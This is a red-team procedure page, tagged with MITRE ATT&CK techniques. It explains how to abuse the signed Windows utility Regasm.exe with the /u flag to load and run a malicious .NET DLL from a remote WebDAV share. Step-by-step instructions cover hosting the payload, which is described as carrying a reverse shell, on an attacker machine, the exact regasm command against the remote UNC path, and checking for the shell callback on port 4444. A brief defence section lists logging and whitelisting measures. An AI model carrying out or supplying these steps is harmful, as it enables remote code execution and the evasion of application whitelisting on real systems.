---
id: b9bfd47d-1054-4e9d-a351-7885e39191b5
name: Regasm-Unregister-to-Execute-Payload-DLL
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:26.932978+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Regsvcs/Regasm|T1121 - Regsvcs/Regasm]]'
sub_techniques: []
tags:
  - '[[tags/Regasm-Regsvc]]'
  - '[[tags/Windows-Download-and-Execute-Methods]]'
  - dotnet
  - bypass
commands:
  - '[[commands/regasm-unregister-unc-dll]]'
platforms:
  - Windows
tools: []
validated: true
---

# Regasm-Unregister-to-Execute-Payload-DLL

## Summary

This procedure uses the legitimate Windows utility Regasm.exe to execute a malicious .NET assembly (DLL) by unregistering it from a remote UNC path, such as a WebDAV server. The /u (unregister) flag causes Regasm to load the assembly into memory, triggering any embedded payload code while appearing as benign system activity. This technique bypasses application whitelisting policies that allow signed Microsoft binaries like Regasm.

## Description

Regasm.exe, part of the .NET Framework, is designed to register .NET assemblies for COM interop. When invoked with the /u flag on a DLL located at a UNC path, it downloads and loads the assembly to process the unregistration, executing any static constructors or code within the DLL. This allows attackers to deliver and execute payloads remotely without dropping files locally, evading endpoint detection. Regsvc.exe functions similarly for service registration but is not covered here. This method is effective in environments with .NET installed (common on Windows servers and workstations) and can be chained with initial access vectors like phishing or drive-by downloads to achieve code execution.

## Requirements

1. Administrative or user-level access to a Windows system with .NET Framework 4.0 or later installed (typically at C:\Windows\Microsoft.NET\Framework64\v4.0.30319\).
2. A malicious .NET DLL payload hosted on an accessible remote share, such as a WebDAV server (e.g., \webdavserver\folder\payload.dll), that the target can reach over the network.
3. Network connectivity from the target to the attacker's controlled server; firewall rules must allow SMB/WebDAV traffic (ports 445 or 80/443).
4. PowerShell or Command Prompt execution privileges; no additional tools required beyond built-in Windows components.

## Defense

- Implement application whitelisting (e.g., via AppLocker or WDAC) to restrict Regasm.exe execution to trusted paths and arguments; monitor for unusual invocations.
- Enable detailed logging of .NET runtime events (ETW) and process creation (Sysmon Event ID 1) to detect Regasm spawning child processes or network connections.
- Block or monitor outbound SMB/WebDAV traffic to untrusted UNC paths using network segmentation and proxies.
- Regularly scan for and patch .NET Framework vulnerabilities; use AMSI (Antimalware Scan Interface) to inspect loaded assemblies.

## Objectives

1. Load and execute a malicious .NET DLL remotely without local file drops.
2. Bypass application whitelisting by leveraging a signed Microsoft binary.
3. Achieve arbitrary code execution, potentially leading to persistence, privilege escalation, or data exfiltration.

## Instructions

### Step 1: Verify .NET Framework Installation

**Context**: Confirm the presence of Regasm.exe to ensure the technique is viable; this prevents errors during execution and identifies the correct path for 32-bit or 64-bit systems.

Run a command to check the .NET version and Regasm location.

**Command** ([[commands/regasm-unregister-unc-dll]] variant for check):
```cmd
where regasm
```

> This locates Regasm.exe. If not found, fall back to manual path verification. Expected: Output showing paths like C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe.

### Step 2: Host Malicious DLL on Remote Share

**Context**: The payload DLL must be accessible via UNC path; use a WebDAV server to host it, ensuring the target can authenticate or access anonymously if possible.

Set up a simple WebDAV share on your attacker machine (e.g., using Apache or IIS) and upload the compiled malicious .NET DLL (e.g., containing a reverse shell in its static constructor).

> No specific command here; use tools like Python's SimpleHTTPServer with WebDAV module or Windows IIS. Expected: DLL accessible at \\webdavserver\folder\payload.dll (test with dir \\webdavserver\folder from target).

If access fails, check firewall and share permissions; otherwise, proceed.

### Step 3: Execute Unregister to Trigger Payload

**Context**: Invoke Regasm with the /u flag on the remote DLL path; this loads the assembly, executing the payload while simulating unregistration.

**Command** ([[commands/regasm-unregister-unc-dll]]):
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

> The /u flag forces loading of the DLL for unregistration processing, running any code. Use 32-bit path (Framework without 64) if targeting 32-bit processes. Expected: Console output like "Types unregistered successfully" if no errors, plus payload effects (e.g., network callback to attacker listener).

### Step 4: Verify Payload Execution

**Context**: Confirm success by checking for payload indicators, such as a reverse shell connection or log entries.

Monitor your listener (e.g., netcat on attacker side) for incoming connections from the target.

**Command** (basic check):
```cmd
netstat -an | findstr :4444
```

> Replace 4444 with your payload's callback port. Expected: Established connection from target IP if payload executed successfully.

If no callback, review event logs (Event Viewer > Windows Logs > Security) for Regasm activity or errors.
